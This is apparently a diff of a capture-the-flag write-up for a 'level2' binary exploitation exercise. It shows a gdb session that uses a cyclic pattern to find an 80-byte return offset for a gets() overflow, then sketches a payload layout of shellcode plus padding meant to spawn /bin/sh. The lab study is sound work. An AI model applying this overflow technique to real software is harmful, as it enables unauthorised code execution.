@@ -14,7 +14,15 @@ We found a call to gets() again, but this time it is protected by a restriction 
 
 After a lot of searching we realise we can inject gets() into the strdup function along with shellcode to access /bin/sh. 
 
-We add the 76 bytes with shellcode to char local_50[76] + 4 bytes for the return, then add a valid return address. 
+    (gdb) run
+    Starting program: /home/user/level2/level2 
+    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x37634136 in ?? ()
+
+0x37634136 -> 7cA6 so we found an offset of 80
 
 21 - bytes shell code
 59 - bytes padding
